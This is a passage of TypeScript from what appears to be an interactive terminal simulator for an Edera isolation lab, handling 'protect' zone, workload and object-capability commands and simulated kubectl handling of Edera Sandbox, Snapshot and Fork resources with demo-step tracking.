            kernelVariant = tokens[++i] || "";
          } else if (token.startsWith("--kernel-variant=")) {
            kernelVariant = token.slice("--kernel-variant=".length);
          }
        }

        if (!name) {
          printHtml(
            `<span style="color:#ff7373;">Error: zone name required. Usage: protect zone launch -n &lt;name&gt;</span>`,
          );
          return true;
        }

        if (device) {
          if (device !== "gpu0") {
            printHtml(
              `<span style="color:#ff7373;">Error: PCI device "${escapeHtml(
                device,
              )}" is not configured.</span>`,
            );
            return true;
          }

          if (!protectDaemonRestarted) {
            printHtml(
              `<span style="color:#ff7373;">Error: Protect daemon configuration has not been restarted. Run: sudo systemctl restart protect-daemon</span>`,
            );
            return true;
          }

          if (!gpuVfioBound) {
            printHtml(
              `<span style="color:#ff7373;">Error: GPU ${GPU_PCI_LOCATION} is not bound to vfio-pci. Complete the KVM VFIO setup first.</span>`,
            );
            return true;
          }

          if (kernelVariant !== "nvidia") {
            printHtml(
              `<span style="color:#ff7373;">Error: GPU zones require --kernel-variant nvidia.</span>`,
            );
            return true;
          }
        }

        if (
          protectZones.some(
            (zone) => zone.name === name && zone.state !== "destroyed",
          )
        ) {
          printHtml(
            `<span style="color:#ff7373;">Error: zone "${escapeHtml(name)}" already exists.</span>`,
          );
          return true;
        }

        launchProtectZone(
          name,
          minCpus,
          maxCpus,
          targetCpus,
          device || undefined,
          kernelVariant || undefined,
        );

        markDemoStepComplete("zone-launch");
        if (activeDemoMode === "agent-sandbox" && name === OCAP_ZONE_NAME) {
          markDemoStepComplete("protect-zone-launch");
        }
        if (name === README_ZONE_NAME) {
          markDemoStepComplete("readme-zone-launch");
        }

        return true;
      }

      if (subcommand === "destroy") {
        let identifier = "";
        let all = false;
        let wait = false;
        let selector = "";

        for (let i = 3; i < tokens.length; i++) {
          const token = tokens[i];

          if (token === "-W" || token === "--wait") {
            wait = true;
          } else if (token === "-A" || token === "--all") {
            all = true;
          } else if (token === "-l" || token === "--selector") {
            selector = tokens[++i] || "";
          } else if (token.startsWith("--selector=")) {
            selector = token.slice("--selector=".length);
          } else if (!identifier) {
            identifier = token;
          }
        }

        if (!identifier) {
          printHtml(`
            <span style="color:#ff7373;">Usage: protect zone destroy [OPTIONS] &lt;ZONE&gt;</span>
          `);
          return true;
        }

        destroyProtectZones(
          identifier,
          all,
          wait,
          selector || undefined,
        );

        if (identifier === "zone-gpu") {
          markDemoStepComplete("gpu-zone-destroy");
        }

        markDemoStepComplete("zone-destroy");
        if (activeDemoMode === "agent-sandbox" && identifier === OCAP_ZONE_NAME) {
          markDemoStepComplete("protect-zone-destroy");
        }
        if (identifier === README_ZONE_NAME) {
          markDemoStepComplete("readme-zone-destroy");
        }

        return true;
      }

      printHtml(
        `<span style="color:#ff7373;">Unknown protect zone command: ${escapeHtml(
          tokens.slice(2).join(" "),
        )}</span>`,
      );

      return true;
    }

    if (tokens[1] === "workload") {
      const subcommand = tokens[2];

      if (subcommand === "list") {
        let selector = "";
        for (let i = 3; i < tokens.length; i++) {
          if (tokens[i] === "--selector" || tokens[i] === "-l") selector = tokens[++i] || "";
          else if (tokens[i].startsWith("--selector=")) selector = tokens[i].slice(11);
        }
        let workloads = [...protectWorkloads];
        if (selector) {
          const match = selector.trim().match(/^status\.state\s*=\s*(.+)$/i);
          if (!match) { printHtml(`<span style="color:#ff7373;">Invalid selector "${escapeHtml(selector)}".</span>`); return true; }
          const state = match[1].trim().toLowerCase();
          workloads = workloads.filter((workload) => workload.state === state);
        }
        const output = parseProtectOutputFormat(tokens);
        if (output === "json" || output === "json-pretty") renderProtectWorkloadJson(workloads, output === "json-pretty");
        else renderProtectWorkloadList(workloads);

        if (!completedDemoSteps.has("edera-workload-list")) {
          markDemoStepComplete("edera-workload-list");
        } else {
          markDemoStepComplete("workload-list");
        }

        if (protectWorkloads.some((workload) => workload.name === "workload-gpu")) {
          markDemoStepComplete("gpu-workload-list");
        }

        if (
          workloads.some(
            (workload) =>
              workload.name === SANDBOX_SESSION_NAME && workload.ocapConsumed?.length,
          )
        ) {
          markDemoStepComplete("session-workload");
        }

        return true;
      }

      if (subcommand === "launch") {
        if (tokens.includes("-h") || tokens.includes("--help")) {
          printPre(formatWorkloadLaunchHelpText());
          markDemoStepComplete("ocap-workload-help");
          return true;
        }

        let zone = "";
        let name = "";
        const ocapConsume: string[] = [];
        const ocapPublish: string[] = [];
        const ocapImplements: string[] = [];
        const mountSpecs: string[] = [];
        const positional: string[] = [];

        // Flags that take a value, in both "--flag value" and "--flag=value" form.
        const valueFlags: Record<string, (value: string) => void> = {
          "--zone": (value) => (zone = value),
          "-z": (value) => (zone = value),
          "--name": (value) => (name = value),
          "-n": (value) => (name = value),
          "--ocap-consume": (value) => ocapConsume.push(value),
          "--ocap-publish": (value) => ocapPublish.push(value),
          "--ocap-implements": (value) => ocapImplements.push(value),
          "--mounts": (value) => mountSpecs.push(value),
          "-m": (value) => mountSpecs.push(value),
        };

        for (let i = 3; i < tokens.length; i++) {
          const token = tokens[i];

          if (token === "--") {
            positional.push(...tokens.slice(i + 1));
            break;
          }

          const equalsIndex = token.indexOf("=");
          const flag = token.startsWith("-") && equalsIndex > 0
            ? token.slice(0, equalsIndex)
            : token;

          if (valueFlags[flag]) {
            valueFlags[flag](
              flag === token ? tokens[++i] || "" : token.slice(equalsIndex + 1),
            );
          } else if (positional.length > 0 || !token.startsWith("-")) {
            // Everything from the image onwards is the workload's command.
            positional.push(...tokens.slice(i));
            break;
          }
        }

        const image = positional[0] || "";
        const command = positional.slice(1);

        if (!zone || !name || !image) {
          printHtml(`
            <span style="color:#ff7373;">Usage:
  protect workload launch --zone &lt;zone&gt; --name &lt;name&gt; [--ocap-consume &lt;NAME[=PROVIDER]&gt;] &lt;image&gt; [command...]</span>
          `);

          return true;
        }

        // --mounts src=HOST:dst=GUEST[:ro=true|false]
        const mounts: WorkloadMount[] = [];
        for (const spec of mountSpecs) {
          const fields: Record<string, string> = {};
          for (const part of spec.split(":")) {
            const equalsAt = part.indexOf("=");
            if (equalsAt > 0) fields[part.slice(0, equalsAt)] = part.slice(equalsAt + 1);
          }
          if (!fields.src || !fields.dst) {
            printHtml(
              `<span style="color:#ff7373;">Error: --mounts expects src=&lt;HOST_PATH&gt;:dst=&lt;PATH&gt;[:ro=true], got "${escapeHtml(spec)}".</span>`,
            );
            return true;
          }
          if (!HOST_FILES.has(fields.src) && getVirtualFile(resolveVirtualPath(fields.src)) === undefined) {
            printHtml(
              `<span style="color:#ff7373;">Error: mount source "${escapeHtml(fields.src)}" does not exist.</span>`,
            );
            return true;
          }
          mounts.push({
            source: fields.src,
            destination: fields.dst,
            readOnly: fields.ro === "true",
          });
        }

        // --ocap-publish NAME[=COMMAND ARGS]: the command is split with shell
        // word rules and run when the capability is dialed.
        const publishedNames: string[] = [];
        const publishCommands: Record<string, string[]> = {};
        for (const entry of ocapPublish) {
          const equalsAt = entry.indexOf("=");
          const capabilityName = equalsAt >= 0 ? entry.slice(0, equalsAt) : entry;
          if (!capabilityName) {
            printHtml(
              `<span style="color:#ff7373;">Error: --ocap-publish requires NAME[=COMMAND ARGS].</span>`,
            );
            return true;
          }
          publishedNames.push(capabilityName);
          if (equalsAt >= 0) {
            const commandWords = tokenize(entry.slice(equalsAt + 1));
            if (commandWords.length > 0) publishCommands[capabilityName] = commandWords;
          }
        }

        for (const entry of ocapImplements) {
          const implementer = entry.split("=")[0];
          if (!publishedNames.includes(implementer)) {
            printHtml(
              `<span style="color:#ff7373;">Error: --ocap-implements "${escapeHtml(
                entry,
              )}" does not match an --ocap-publish.</span>`,
            );
            return true;
          }
        }

        const launched = launchProtectWorkload(
          zone,
          name,
          image,
          command,
          ocapConsume,
          publishedNames,
          publishCommands,
          mounts,
        );

        if (!launched) {
          return true;
        }

        if (launched.ocapPublished?.includes(OCAP_GITHUB_NAME)) {
          markDemoStepComplete("ocap-relay-launch");
        }

        if (
          name === README_WORKLOAD_NAME &&
          launched.ocapPublishCommands?.[README_CAPABILITY] &&
          launched.mounts?.some((mount) => mount.destination === README_TOKEN_MOUNT_PATH)
        ) {
          markDemoStepComplete("readme-workload-launch");
        }

        if (
          name === OCAP_WORKLOAD_NAME &&
          launched.ocapConsumed?.includes(OCAP_GITHUB_NAME)
        ) {
          markDemoStepComplete("ocap-workload-launch");
        }

        if (name === "workload-gpu" && zone === "zone-gpu") {
          addEvent(
            "Normal",
            "GpuWorkloadStarted",
            `workload/${name}`,
            "CUDA workload started with gpu0 attached",
          );
          markDemoStepComplete("gpu-workload-launch");
        }

        markDemoStepComplete("workload-launch");

        return true;
      }

      if (subcommand === "exec") {
        let identifier = "";
        let commandStart = 3;

        if (tokens[3] === "--tty" || tokens[3] === "-t") {
          identifier = tokens[4] || "";
          commandStart = 5;
        } else {
          identifier = tokens[3] || "";
          commandStart = 4;
        }

        if (!identifier || tokens.length <= commandStart) {
          printHtml(`
            <span style="color:#ff7373;">Usage:
  protect workload exec &lt;workload&gt; &lt;command&gt; [args...]</span>
          `);

          return true;
        }

        execProtectWorkload(
          identifier,
          tokens.slice(commandStart),
        );

        markDemoStepComplete("workload-exec");

        return true;
      }

      if (subcommand === "stop" || subcommand === "start") {
        const identifier = tokens[3] || "";
        const workload = protectWorkloads.find((item) => item.name === identifier || item.uuid === identifier);
        if (!workload) { printHtml(`<span style="color:#ff7373;">Error: workload "${escapeHtml(identifier)}" not found.</span>`); return true; }
        if (subcommand === "stop") {
          if (workload.state !== "running") { printHtml(`<span style="color:#a8cfca;">Workload "${escapeHtml(workload.name)}" is not running.</span>`); return true; }
          workload.state = "stopped";
          addEvent("Normal", "WorkloadStopped", `workload/${workload.name}`, `Workload ${workload.name} stopped`);
          printHtml(`<span style="color:#b8ff3c;">Workload "${escapeHtml(workload.name)}" stopped.</span>`);
        } else {
          if (workload.state !== "stopped") { printHtml(`<span style="color:#a8cfca;">Workload "${escapeHtml(workload.name)}" is not stopped.</span>`); return true; }
          workload.state = "running";
          addEvent("Normal", "WorkloadStarted", `workload/${workload.name}`, `Workload ${workload.name} started`);
          printHtml(`<span style="color:#b8ff3c;">Workload "${escapeHtml(workload.name)}" started.</span>`);
        }
        updateDashboard();
        return true;
      }

      if (subcommand === "destroy") {
        const identifier = tokens[3];

        if (!identifier) {
          printHtml(
            `<span style="color:#ff7373;">Usage: protect workload destroy &lt;workload&gt; [--wait]</span>`,
          );
          return true;
        }

        destroyProtectWorkload(identifier);

        if (identifier === "workload-gpu") {
          markDemoStepComplete("gpu-workload-destroy");
        }

        markDemoStepComplete("workload-destroy");

        return true;
      }

      printHtml(
        `<span style="color:#ff7373;">Unknown protect workload command: ${escapeHtml(
          tokens.slice(2).join(" "),
        )}</span>`,
      );

      return true;
    }

    if (tokens[1] === "object-capability") {
      const subcommand = tokens[2];

      if (subcommand === "dial") {
        const capability = tokens[3] || "";
        if (!capability) {
          printHtml(
            `<span style="color:#ff7373;">Usage: protect object-capability dial &lt;CAPABILITY&gt; [ARGS]...</span>`,
          );
          return true;
        }
        await dialObjectCapability(capability, tokens.slice(4));
        return true;
      }

      printHtml(
        `<span style="color:#ff7373;">Unknown protect object-capability command: ${escapeHtml(
          tokens.slice(2).join(" "),
        )}. Try: protect object-capability dial &lt;CAPABILITY&gt; [ARGS]...</span>`,
      );
      return true;
    }

    if (tokens[1] === "host") {
      const subcommand = tokens[2];
      if (subcommand === "status") {
        printPre(`<span style="color:#dff7f0;">protect-daemon    active (running)
zones             ${protectZones.filter((zone) => zone.state !== "destroyed").length}
workloads         ${protectWorkloads.filter((workload) => workload.state !== "destroyed").length}</span>`);
        return true;
      }
      if (subcommand === "cpu-topology") {
        printPre(`<span style="color:#dff7f0;">CPU TOPOLOGY
Sockets: 1
Cores:   4
Threads: 8

0 1 2 3 4 5 6 7</span>`);
        return true;
      }
      if (subcommand === "hv-debug-info") {
        printPre(`<span style="color:#dff7f0;">Hypervisor: simulated-kvm
Edera isolation: enabled
Zones: ${protectZones.filter((zone) => zone.state !== "destroyed").length}
Kernel isolation: enabled</span>`);
        return true;
      }
      printHtml(`<span style="color:#ff7373;">Unknown protect host command: ${escapeHtml(tokens.slice(2).join(" "))}</span>`);
      return true;
    }

    printHtml(
      `<span style="color:#ff7373;">Unknown protect command. Type "protect --help".</span>`,
    );

    return true;
  };

  const bindStorage = () => {
    for (const pvc of persistentVolumeClaims) {
      if (pvc.status === "Bound") continue;
      const pv = persistentVolumes.find((item) =>
        item.status === "Available" &&
        item.volumeMode === pvc.volumeMode &&
        item.capacity === pvc.capacity &&
        item.accessModes === pvc.accessModes &&
        (!pvc.storageClassName || item.storageClassName === pvc.storageClassName),
      );
      if (!pv) continue;
      pv.status = "Bound";
      pv.claimName = `${pvc.namespace}/${pvc.name}`;
      pvc.status = "Bound";
      pvc.volumeName = pv.name;
      pvc.formatted = pv.formatted;
      addEvent("Normal", "Provisioned", `persistentvolumeclaim/${pvc.name}`, `Successfully bound PVC ${pvc.name} to ${pv.name}`);
      addEvent("Normal", "Bound", `persistentvolumeclaim/${pvc.name}`, `PersistentVolumeClaim ${pvc.name} is bound to ${pv.name}`);
    }
  };

  const storageReadyForDeployment = (claimName: string, volumeMode: "Filesystem" | "Block") => {
    const pvc = persistentVolumeClaims.find((item) => item.name === claimName && item.namespace === "default");
    if (!pvc || pvc.status !== "Bound" || pvc.volumeMode !== volumeMode) return false;
    return volumeMode === "Filesystem" || pvc.formatted;
  };

  const markJobComplete = (job: LocalJob) => {
    if (job.status === "Complete") return;
    job.status = "Complete";
    job.succeeded = job.completions;
    if (job.claimName) {
      const pvc = persistentVolumeClaims.find((item) => item.name === job.claimName && item.namespace === job.namespace);
      if (pvc) {
        pvc.formatted = true;
        const pv = persistentVolumes.find((item) => item.name === pvc.volumeName);
        if (pv) pv.formatted = true;
        addEvent("Normal", "Formatted", `persistentvolumeclaim/${pvc.name}`, `Block device ${pv?.devicePath || "/dev/data"} formatted as ext4`);
      }
    }
    addEvent("Normal", "Completed", `job/${job.name}`, `Job ${job.name} completed successfully`);
  };

  const getManifestKind = (manifestPath: string): string => {
    const manifest = getVirtualFile(manifestPath) || "";
    const match = manifest.match(/^\s*kind:\s*([A-Za-z0-9]+)\s*$/m);
    return match?.[1] || "";
  };

  const getManifestNamespace = (manifestPath: string): string => {
    const manifest = getVirtualFile(manifestPath) || "";
    const match = manifest.match(/^\s+namespace:\s*([A-Za-z0-9][A-Za-z0-9.-]*)\s*$/m);
    return match?.[1] || "default";
  };

  const requireManifestNamespace = (manifestPath: string): string | null => {
    const namespaceName = getManifestNamespace(manifestPath);

    if (!namespaces.some((namespace) => namespace.name === namespaceName)) {
      printHtml(
        `<span style="color:#ff7373;">Error from server (NotFound): namespaces "${escapeHtml(
          namespaceName,
        )}" not found</span>`,
      );
      return null;
    }

    return namespaceName;
  };

  // -----------------------------------------------------------------------
  // Edera-native Sandbox / Snapshot / Fork (runtime.edera.dev/v1alpha1).
  // None exist when the lab starts. The guide has the user read and apply
  // agent-sandbox/edera-{sandbox,snapshot,fork}.yaml in order; this block
  // simulates the Edera runtime controller reconciling them. Each pod the
  // controller creates runs in its own Edera zone, shown in the Zones panel.
  // -----------------------------------------------------------------------
  type EderaRuntimeKind = "Sandbox" | "Snapshot" | "Fork";

  const EDERA_RUNTIME_MANIFESTS: Record<
    EderaRuntimeKind,
    { file: string; name: string; yaml: string }
  > = {
    Sandbox: {
      file: "agent-sandbox/edera-sandbox.yaml",
      name: EDERA_SANDBOX_NAME,
      yaml: EDERA_SANDBOX_YAML,
    },
    Snapshot: {
      file: "agent-sandbox/edera-snapshot.yaml",
      name: EDERA_SNAPSHOT_NAME,
      yaml: EDERA_SNAPSHOT_YAML,
    },
    Fork: {
      file: "agent-sandbox/edera-fork.yaml",
      name: EDERA_FORK_NAME,
      yaml: EDERA_FORK_YAML,
    },
  };

  const EDERA_CRD_NAMES = [
    "sandboxes.runtime.edera.dev",
    "snapshots.runtime.edera.dev",
    "forks.runtime.edera.dev",
    "capabilityproviders.runtime.edera.dev",
    "sandboxtemplates.runtime.edera.dev",
    "sandboxsessions.runtime.edera.dev",
  ];

  // Creation time per kind; absent from the map means "not created".
  const ederaCreatedAt = new Map<EderaRuntimeKind, number>();
  let ederaSandboxReady = false;

  const ederaExists = (kind: EderaRuntimeKind) => ederaCreatedAt.has(kind);

  const ederaResourceRef = (kind: EderaRuntimeKind) =>
    `${kind.toLowerCase()}.runtime.edera.dev/${EDERA_RUNTIME_MANIFESTS[kind].name}`;

  const ederaAge = (kind: EderaRuntimeKind) => {
    const created = ederaCreatedAt.get(kind);
    if (created === undefined) return "<none>";
    const seconds = Math.max(1, Math.floor((Date.now() - created) / 1000));
    return seconds < 120 ? `${seconds}s` : `${Math.floor(seconds / 60)}m`;
  };

  const isEderaSandboxPod = (pod: LocalPod) =>
    pod.labels["runtime.edera.dev/sandbox"] === EDERA_SANDBOX_NAME;
  const isEderaForkPod = (pod: LocalPod) =>
    pod.labels["runtime.edera.dev/fork"] === EDERA_FORK_NAME;
  const ederaManagedPods = () =>
    pods.filter((pod) => isEderaSandboxPod(pod) || isEderaForkPod(pod));
  const ederaForkPods = () => pods.filter(isEderaForkPod);

  // One Edera zone per controller-created pod, mirroring how the Edera
  // runtime isolates each pod behind its own guest kernel.
  const startEderaZoneForPod = (pod: LocalPod) => {
    if (protectZones.some((zone) => zone.name === pod.name && zone.state !== "destroyed")) {
      return;
    }
    const zone: ProtectZone = {
      name: pod.name,
      uuid: crypto.randomUUID(),
      state: "ready",
      ipv4: nextZoneIp(),
      ipv6: nextZoneIpv6(),
      minCpus: 1,
      maxCpus: 2,
      targetCpus: 2,
    };
    protectZones.push(zone);
    protectWorkloads.push({
      name: pod.name,
      uuid: crypto.randomUUID(),
      zone: zone.uuid,
      state: "running",
      image: pod.image,
      command: [],
      sourcePodName: pod.name,
    });
    addEvent("Normal", "ZoneReady", `zone/${pod.name}`, `Edera zone ${pod.name} is ready`);
  };

  const stopEderaZoneForPod = (podName: string) => {
    const zoneIds = protectZones
      .filter((zone) => zone.name === podName)
      .map((zone) => zone.uuid);
    protectWorkloads = protectWorkloads.filter(
      (workload) => workload.sourcePodName !== podName && !zoneIds.includes(workload.zone),
    );
    protectZones = protectZones.filter((zone) => zone.name !== podName);
    if (zoneIds.length) {
      addEvent("Normal", "ZoneDestroyed", `zone/${podName}`, `Edera zone ${podName} destroyed`);
    }
  };

  const removeEderaPods = (predicate: (pod: LocalPod) => boolean) => {
    for (const pod of pods.filter(predicate)) stopEderaZoneForPod(pod.name);
    pods = pods.filter((pod) => !predicate(pod));
  };

  const printEderaError = (message: string) =>
    printHtml(`<span style="color:#ff7373;">${escapeHtml(message)}</span>`);

  // Map a kubectl resource token to an Edera runtime kind. Both
  // runtime.edera.dev and the upstream Agent Sandbox (agents.x-k8s.io)
  // define `kind: Sandbox`. The lab defaults a bare `sandbox` to the Edera
  // resource; the upstream one (agent-sandbox/sandbox.yaml, kept for
  // reading) is reached with `sandboxes.agents.x-k8s.io` or by naming
  // my-sandbox.
  const resolveEderaRuntimeKind = (
    token: string,
    requestedNames: string[],
  ): EderaRuntimeKind | null => {
    const lower = token.toLowerCase();
    const [base, ...group] = lower.split(".");
    const groupName = group.join(".");
    if (groupName && groupName !== "runtime.edera.dev") return null;

    if (["snapshot", "snapshots"].includes(base)) return "Snapshot";
    if (["fork", "forks"].includes(base)) return "Fork";
    if (["sandbox", "sandboxes"].includes(base)) {
      if (groupName) return "Sandbox";
      if (requestedNames.includes("my-sandbox")) return null;
      return "Sandbox";
    }
    return null;
  };

  const ederaRuntimeTable = (kind: EderaRuntimeKind) => {
    const name = { text: EDERA_RUNTIME_MANIFESTS[kind].name, color: "#b8ff3c" };
    const age = ederaAge(kind);
    if (kind === "Sandbox") {
      return formatTerminalTable(
        ["NAME", "READY", "NODE", "AGE"],
        [[
          name,
          ederaSandboxReady ? "True" : "False",
          ederaSandboxReady ? EDERA_SANDBOX_NODE : "<none>",
          age,
        ]],
      );
    }
    if (kind === "Snapshot") {
      return formatTerminalTable(
        ["NAME", "SANDBOX", "REMOTE", "NODE", "READY", "AGE"],
        [[name, EDERA_SANDBOX_NAME, "Local", EDERA_SANDBOX_NODE, "True", age]],
      );
    }
    const ready = ederaForkPods().filter((pod) => pod.status === "Running").length;
    return formatTerminalTable(
      ["NAME", "SOURCE", "REMOTE", "READY", "AGE"],
      [[name, `sandbox/${EDERA_SANDBOX_NAME}`, "Local", `${ready}/${EDERA_FORK_REPLICAS}`, age]],
    );
  };

  const ederaPodTable = (selected: LocalPod[]) =>
    formatTerminalTable(
      ["POD", "STATUS", "RUNTIME", "IP", "NODE"],
      selected.map((pod) => [
        { text: pod.name, color: "#b8ff3c" },
        pod.status,
        effectiveRuntimeClass(pod) || "<none>",
        pod.ip,
        pod.node,
      ]),
    );

  const ederaRuntimeDescribe = (kind: EderaRuntimeKind) => {
    const { name } = EDERA_RUNTIME_MANIFESTS[kind];
    const lines = [
      `Name:         ${name}`,
      `Namespace:    default`,
      `API Version:  runtime.edera.dev/v1alpha1`,
      `Kind:         ${kind}`,
    ];
    if (kind === "Sandbox") {
      lines.push(
        `Spec:`,
        `  Pod Template:`,
        `    Containers:`,
        `      workload: ${EDERA_SANDBOX_IMAGE}`,
        `Status:`,
        `  Node:     ${ederaSandboxReady ? EDERA_SANDBOX_NODE : "<none>"}`,
        `  Runtime:  edera (dedicated zone kernel ${EDERA_ZONE_KERNEL})`,
        `  Ready:    ${ederaSandboxReady ? "True" : "False"}`,
      );
    } else if (kind === "Snapshot") {
      lines.push(
        `Spec:`,
        `  Sandbox Name:  ${EDERA_SANDBOX_NAME}`,
        `  Remote:        Local`,
        `Status:`,
        `  Node:   ${EDERA_SANDBOX_NODE}  (Local snapshots stay on the sandbox's node)`,
        `  Ready:  True`,
      );
    } else {
      const forks = ederaForkPods();
      lines.push(
        `Spec:`,
        `  Source:`,
        `    Sandbox:  ${EDERA_SANDBOX_NAME}`,
        `  Remote:    Local`,
        `  Replicas:  ${EDERA_FORK_REPLICAS}`,
        `Status:`,
        `  Ready Replicas:  ${forks.filter((pod) => pod.status === "Running").length}`,
        `  Forks:`,
        ...forks.map((pod) => `    ${pod.name}  ${pod.status}  ${pod.node}`),
      );
    }
    lines.push(`Events:       <none>`);
    return lines.join("\n");
  };

  const applyEderaRuntimeResource = (kind: EderaRuntimeKind) => {
    const ref = ederaResourceRef(kind);

    if (ederaExists(kind)) {
      printHtml(`<span style="color:#a8cfca;">${escapeHtml(ref)} unchanged</span>`);
      return;
    }

    if (kind === "Sandbox") {
      ederaCreatedAt.set(kind, Date.now());
      ederaSandboxReady = false;
      pods.push({
        name: EDERA_SANDBOX_NAME,
        namespace: "default",
        status: "Pending",
        age: "1s",
        image: EDERA_SANDBOX_IMAGE,
        ip: "<none>",
        node: "<none>",
        labels: {
          "app.kubernetes.io/name": EDERA_SANDBOX_NAME,
          "runtime.edera.dev/sandbox": EDERA_SANDBOX_NAME,
        },
        runtimeClassName: "edera",
      });
      addEvent(
        "Normal",
        "SandboxCreated",
        `sandbox/${EDERA_SANDBOX_NAME}`,
        "Edera runtime controller is creating the sandbox pod with runtimeClassName=edera",
      );
      markDemoStepComplete("edera-sandbox-apply");
    } else {
      // Snapshot and Fork both capture the running sandbox, so it has to
      // exist and be Ready first.
      if (!ederaExists("Sandbox")) {
        printEderaError(
          `Error from server (NotFound): sandboxes.runtime.edera.dev "${EDERA_SANDBOX_NAME}" not found`,
        );
        return;
      }
      if (!ederaSandboxReady) {
        printEderaError(
          `Error: sandbox "${EDERA_SANDBOX_NAME}" is not Ready yet. Run: kubectl wait --for=condition=Ready sandbox/${EDERA_SANDBOX_NAME}`,
        );
        return;
      }

      ederaCreatedAt.set(kind, Date.now());

      if (kind === "Snapshot") {
        addEvent(
          "Normal",
          "SnapshotReady",
          `snapshot/${EDERA_SNAPSHOT_NAME}`,
          `Captured ${EDERA_SANDBOX_NAME}; stored locally on ${EDERA_SANDBOX_NODE}`,
        );
        markDemoStepComplete("edera-snapshot-apply");
      } else {
        for (let index = 0; index < EDERA_FORK_REPLICAS; index++) {
          const pod: LocalPod = {
            name: `${EDERA_FORK_NAME}-${index}`,
            namespace: "default",
            status: "Running",
            age: "1s",
            image: EDERA_SANDBOX_IMAGE,
            ip: `10.244.0.${52 + index}`,
            node: EDERA_SANDBOX_NODE,
            labels: {
              "app.kubernetes.io/name": EDERA_SANDBOX_NAME,
              "runtime.edera.dev/fork": EDERA_FORK_NAME,
            },
            runtimeClassName: "edera",
          };
          pods.push(pod);
          startEderaZoneForPod(pod);
        }
        addEvent(
          "Normal",
          "ForkReady",
          `fork/${EDERA_FORK_NAME}`,
          `${EDERA_FORK_REPLICAS} forks of ${EDERA_SANDBOX_NAME} resumed from a local snapshot on ${EDERA_SANDBOX_NODE}`,
        );
        markDemoStepComplete("edera-fork-apply");
      }
    }

    printHtml(`<span style="color:#b8ff3c;">${escapeHtml(ref)} created</span>`);
    updateDashboard();
  };

  const deleteEderaRuntimeResource = (kind: EderaRuntimeKind): boolean => {
    if (!ederaExists(kind)) return false;
    ederaCreatedAt.delete(kind);
    if (kind === "Sandbox") {
      ederaSandboxReady = false;
      removeEderaPods(isEderaSandboxPod);
    } else if (kind === "Fork") {
      removeEderaPods(isEderaForkPod);
    }
    addEvent(
      "Normal",
      `${kind}Deleted`,
      `${kind.toLowerCase()}/${EDERA_RUNTIME_MANIFESTS[kind].name}`,
      `${kind} ${EDERA_RUNTIME_MANIFESTS[kind].name} deleted`,
    );
    printHtml(
      `<span style="color:#b8ff3c;">${kind.toLowerCase()}.runtime.edera.dev "${escapeHtml(
        EDERA_RUNTIME_MANIFESTS[kind].name,
      )}" deleted</span>`,
    );
    return true;
  };

  const ederaKindForFile = (path: string): EderaRuntimeKind | null => {
    const normalized = path.replace(/^['"]|['"]$/g, "");
    const kind = (Object.keys(EDERA_RUNTIME_MANIFESTS) as EderaRuntimeKind[]).find(
      (item) => normalized.endsWith(EDERA_RUNTIME_MANIFESTS[item].file),
    );
    return kind || null;
  };

  const handleEderaRuntimeResources = (tokens: string[]): boolean => {
    const verb = tokens[1];

    // kubectl apply|delete -f agent-sandbox/edera-*.yaml (one or more -f).
    if ((verb === "apply" || verb === "delete") && tokens.includes("-f")) {
      const files = tokens
        .map((token, index) => (tokens[index - 1] === "-f" ? token : null))
        .filter((token): token is string => token !== null);
      const kinds = files.map(ederaKindForFile);
      if (kinds.length === 0 || kinds.some((kind) => kind === null)) return false;
      for (const kind of kinds as EderaRuntimeKind[]) {
        if (verb === "apply") {
          applyEderaRuntimeResource(kind);
        } else if (!deleteEderaRuntimeResource(kind)) {
          printEderaError(
            `Error from server (NotFound): ${kind.toLowerCase()}s.runtime.edera.dev "${EDERA_RUNTIME_MANIFESTS[kind].name}" not found`,
          );
        }
      }
      if (verb === "delete") {
        updateDashboard();
        if (ederaCreatedAt.size === 0) markDemoStepComplete("edera-cleanup");
      }
      return true;
    }

    // kubectl wait --for=condition=Ready sandbox/sandbox-sample
    if (verb === "wait") {
      const target = tokens.find((token) => token.includes("/") && !token.startsWith("-"));
      if (!target) return false;
      const [resource, name] = target.split("/");
      const kind = resolveEderaRuntimeKind(resource, [name]);
      if (!kind || name !== EDERA_RUNTIME_MANIFESTS[kind].name) return false;
      if (!ederaExists(kind)) {
        printEderaError(
          `Error from server (NotFound): ${kind.toLowerCase()}s.runtime.edera.dev "${name}" not found`,
        );
        return true;
      }
      if (kind === "Sandbox" && !ederaSandboxReady) {
        ederaSandboxReady = true;
        const pod = pods.find(isEderaSandboxPod);
        if (pod) {
          pod.status = "Running";
          pod.node = EDERA_SANDBOX_NODE;
          pod.ip = "10.244.0.51";
          startEderaZoneForPod(pod);
        }
        addEvent(
          "Normal",
          "SandboxReady",
          `sandbox/${EDERA_SANDBOX_NAME}`,
          `Sandbox is Ready in its own Edera zone on ${EDERA_SANDBOX_NODE}`,
        );
        updateDashboard();
      }
      if (kind === "Sandbox") markDemoStepComplete("edera-sandbox-ready");
      printHtml(
        `<span style="color:#b8ff3c;">${escapeHtml(ederaResourceRef(kind))} condition met</span>`,
      );
      return true;
    }

    // kubectl exec [-it] <sandbox or fork pod> -- <command>
    if (verb === "exec") {
      const separator = tokens.indexOf("--");
      const head = separator >= 0 ? tokens.slice(2, separator) : tokens.slice(2);
      const podName = head.find(
        (token) =>
          token === EDERA_SANDBOX_NAME || token.startsWith(`${EDERA_FORK_NAME}-`),
      );
      if (!podName) return false;
      const pod = pods.find((item) => item.name === podName);
      if (!pod) {
        printEderaError(`Error from server (NotFound): pods "${podName}" not found`);
        return true;
      }
      if (pod.status !== "Running") {
        printEderaError(
          `error: unable to upgrade connection: container not found ("workload"); is ${podName} Ready?`,
        );
        return true;
      }
      const commandText = (separator >= 0 ? tokens.slice(separator + 1) : []).join(" ");
      const forkPod = isEderaForkPod(pod);
      if (/uname\s+-r/.test(commandText)) {
        printPre(`<span style="color:#b8ff3c;">${EDERA_ZONE_KERNEL}</span>`);
        markDemoStepComplete(forkPod ? "edera-fork-exec" : "edera-sandbox-kernel");
      } else if (/python3\s+-c/.test(commandText) && /2\s*\+\s*2/.test(commandText)) {
        printPre(`<span style="color:#b8ff3c;">4</span>`);
        markDemoStepComplete(forkPod ? "edera-fork-exec" : "edera-sandbox-exec");
      } else if (/^hostname\b/.test(commandText)) {
        printPre(`<span style="color:#b8ff3c;">${escapeHtml(podName)}</span>`);
        if (forkPod) markDemoStepComplete("edera-fork-exec");
      } else {
        printHtml(
          `<span style="color:#dff7f0;">Executed inside ${escapeHtml(podName)}: ${escapeHtml(
            commandText || "<shell>",
          )}</span>`,
        );
        if (forkPod) markDemoStepComplete("edera-fork-exec");
      }
      addEvent(
        "Normal",
        "ExecInZone",
        `pod/${podName}`,
